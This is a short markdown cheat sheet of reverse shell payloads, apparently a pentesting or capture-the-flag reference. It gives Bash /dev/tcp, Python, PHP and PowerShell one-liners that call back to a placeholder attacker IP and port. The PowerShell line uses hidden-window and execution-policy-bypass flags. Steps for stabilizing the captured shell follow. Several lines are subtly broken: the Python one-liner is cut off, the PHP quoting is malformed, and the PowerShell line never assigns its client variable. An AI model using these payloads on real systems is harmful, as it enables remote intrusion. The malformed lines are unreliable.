# Reverse Shells
1. [Reverse Shell Generator](https://www.revshells.com/)

2. Bash
    ```
    bash -i >& /dev/tcp/<IP ADDRESS>/<PORT> 0>&1
    ```
3. Python
    ```
    python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("<IP ADDRESS>",<PORT>)
    ```
4. PHP
    ```
    php -r '$sock=fsockopen("<"IP ADDRESS",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
    ```
5. Powershell
    ```powershell
    powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<IP ADDRESS",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()    
    ```



# Reverse Shell Stabilization
1. Via Python
    ```
    (On Target Machine) python -c 'import pty; pty.spawn("/bin/bash")'
    (On Attack Machine) stty raw -echo; fg; reset
    ```
2. Via script
    ```
    (On Target Machine) /usr/bin/script -qc /bin/bash /dev/null
    (On Attack Machine) stty raw -echo; fg; reset
    ```
